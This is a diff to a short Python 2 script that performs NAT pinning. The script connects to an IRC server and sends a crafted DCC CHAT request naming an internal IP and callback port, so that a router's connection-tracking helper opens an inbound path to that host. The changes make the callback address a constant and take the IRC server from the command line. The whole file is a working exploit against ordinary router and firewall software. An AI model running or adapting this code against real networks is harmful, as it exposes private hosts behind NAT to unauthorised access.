@@ -4,6 +4,7 @@ from threading import Thread
 import random
 import socket
 import struct
+import sys
 
 
 #Natpinnging via:
@@ -14,7 +15,8 @@ import struct
 
 IRC_NICK = "natpin" + str(random.randint(1, 1000))
 IRC_BOUNCE_NICK="raf"
-CALLBACK_PORT= 8822
+CALLBACK_PORT= 8080
+CALLBACK_IP = "192.168.0.198"
 
 class IRCClient():
 	class serverMSG():
@@ -59,7 +61,7 @@ class IRCClient():
 			print "end of motd"
 			self.Connected = 1
 			self.s.send("JOIN #xyz\r\n")
-			self.DCCChat("raf","192.168.0.198", CALLBACK_PORT)
+			self.DCCChat("raf",CALLBACK_IP, CALLBACK_PORT)
 	#end def
 	def DCCChat(self, nick, IPAddress, port):
 		intIP = struct.unpack("!I", socket.inet_aton(IPAddress))[0]
@@ -75,6 +77,6 @@ class IRCClient():
 	#end def
 #end class
 
-x = IRCClient("62.213.198.42",6667)
+x = IRCClient(sys.argv[1],6667)
 #x = IRCClient("127.0.0.1",6667)
 
